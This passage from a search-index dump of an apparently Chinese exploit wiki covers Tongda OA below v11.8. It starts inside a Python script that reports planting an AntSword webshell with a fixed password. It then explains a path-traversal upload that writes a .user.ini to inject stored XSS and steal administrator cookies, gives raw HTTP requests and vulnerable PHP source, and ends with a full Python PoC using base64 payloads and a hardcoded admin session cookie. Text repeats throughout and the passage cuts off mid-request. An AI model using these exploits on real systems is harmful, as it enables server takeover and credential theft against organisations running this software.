Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u6210\u529f\u4e0a\u4f20\u8681\u5251\u6728\u9a6c \u5bc6\u7801\u4e3a: PeiQi \\n [o] webshell\u8def\u5f84: {} /general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) while True : POC_0 ( target_url ) time . sleep ( 5 )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709xss\u8bed\u53e5\u7684\u6587\u4ef6\uff0c\u4f7f\u7ba1\u7406\u5458\u540e\u53f0\u6587\u4ef6\u5747\u5305\u542bXSS\u8bed\u53e5\uff0c\u88ab\u653b\u51fb\u8005\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA < v11.8 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c\uff0cv11.6\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\u5229\u7528\u8f83\u597d\uff0c\u5728 v11.7 \u540e\u7eed\u7248\u672c\u4e2d\u89c4\u5b9a\u4e86\u4e0a\u4f20\u8def\u5f84\uff0c\u5bfc\u81f4XSS\u5229\u7528\u4f1a\u6bd4\u8f83\u56f0\u96be \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bXSS\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6 \u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u6211\u4eec\u60f3\u8981\u6700\u5927\u5316\u5229\u7528\u53ef\u4ee5\u4e0a\u4f20\u5728**\u9996\u9875\u6216\u8005\u7ba1\u7406\u5458** \u754c\u9762\uff0c\u5229\u7528\u81ea\u5b9a\u4e49\u5f39\u7a97\u6765\u6e17\u900f \u8fd9\u91cc\u5bf9\u7ba1\u7406\u5458\u9875\u9762 general \u76ee\u5f55\u4e0a\u4f20 \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log \u8fd9\u91cc\u62fc\u63a5\u540e\u4e0a\u4f20\u5c31\u53d8\u6210\u4e86 .user.ini \u8fd9\u91cc\u518d\u4e0a\u4f20 XSS\u6587\u4ef6 peiqi.log \u88ab\u5305\u542b\u8fdb\u53bb \u4e0a\u4f20\u540e\u6bcf\u6b21\u7ba1\u7406\u5458\u767b\u5f55\u540e\u90fd\u4f1a\u5e26\u7740Cookie\u8bf7\u6c42\u4e00\u6b21XSS\u5e73\u53f0 \u9493\u9c7c\u4ec0\u4e48\u7684\u4ee3\u7801\u5199\u5728peiqi.log\u6587\u4ef6\u91cc\u5c31\u597d\u5566 \u521a\u521a\u63d0\u5230\u4e86 v11.7\u7248\u672c\u4e0d\u65b9\u4fbf\u5229\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u540e\u7eed\u7248\u672c\u52a0\u4e0a\u4e86\u6587\u4ef6\u4e0a\u4f20\u7684\u89c4\u5b9a\u8def\u5f84 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } \u8def\u5f84\u4e2d\u5fc5\u987b\u8981\u5305\u542b webroot \u548c attachment \u624d\u53ef\u4ee5\u4e0a\u4f20 \u8fd9\u91ccXSS\u7684\u5229\u7528\u70b9\u67094\u4e2a\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u6700\u6709\u51e0\u7387XSS\u7684\u4e3a**\u5b58\u50a8\u76ee\u5f55\u7ba1\u7406\u7684\u6587\u4ef6\u5939** \u7528\u540c\u6837\u7684\u65b9\u6cd5\u4e0a\u4f20\u5229\u7528\u6587\u4ef6\uff0c\u6bcf\u6b21\u5f53\u7ba1\u7406\u5458\u8bbe\u7f6e\u65f6\u5c31\u4f1a\u76d7\u53d6Cookie \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u56e0\u4e3a\u662fxss\u53ef\u80fd\u5bf9\u76ee\u6807\u6709\u5f71\u54cd\uff0c\u6240\u4ee5\u8fd9\u91ccPOC\u5728\u4e00\u4e2a\u4e0d\u5e38\u7528\u76ee\u5f55\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e Cookie\u586b\u5199\u8bbf\u95ee\u540e\u53f0\u65f6\u7684Cookie, \u5176\u4e2d\u7684base64\u89e3\u7801\u66f4\u6539 PeiQi_Wiki\u4e3a \u81ea\u5df1\u7684XSS\u8bed\u53e5 v11.6\u53ca\u4ee5\u4e0b \u653b\u51fb /general \u548c /general/system/attachment \u76ee\u5f55\u8f83\u597d v11.6\u4ee5\u4e0a \u653b\u51fb /general/system/attachment \u76ee\u5f55\u8f83\u597d import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728XSS\u6f0f\u6d1e, \u53ef\u53c2\u8003\u6587\u7ae0\u5199\u7684\u5229\u7528\u7248\u672c\u8fdb\u4e00\u6b65\u653b\u51fb \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie ) \u53c2\u8003\u6587\u7ae0 \u00b6 https://paper.seebug.org/1499/","title":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542bXSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u901a\u8fbeoa-v118-\u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bxss\u6f0f\u6d1e","text":"","title":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709xss\u8bed\u53e5\u7684\u6587\u4ef6\uff0c\u4f7f\u7ba1\u7406\u5458\u540e\u53f0\u6587\u4ef6\u5747\u5305\u542bXSS\u8bed\u53e5\uff0c\u88ab\u653b\u51fb\u8005\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA < v11.8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c\uff0cv11.6\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\u5229\u7528\u8f83\u597d\uff0c\u5728 v11.7 \u540e\u7eed\u7248\u672c\u4e2d\u89c4\u5b9a\u4e86\u4e0a\u4f20\u8def\u5f84\uff0c\u5bfc\u81f4XSS\u5229\u7528\u4f1a\u6bd4\u8f83\u56f0\u96be \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bXSS\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6 \u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u6211\u4eec\u60f3\u8981\u6700\u5927\u5316\u5229\u7528\u53ef\u4ee5\u4e0a\u4f20\u5728**\u9996\u9875\u6216\u8005\u7ba1\u7406\u5458** \u754c\u9762\uff0c\u5229\u7528\u81ea\u5b9a\u4e49\u5f39\u7a97\u6765\u6e17\u900f \u8fd9\u91cc\u5bf9\u7ba1\u7406\u5458\u9875\u9762 general \u76ee\u5f55\u4e0a\u4f20 \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 Content-Disposition: form-data; name=\"ATTACHMENT\"; 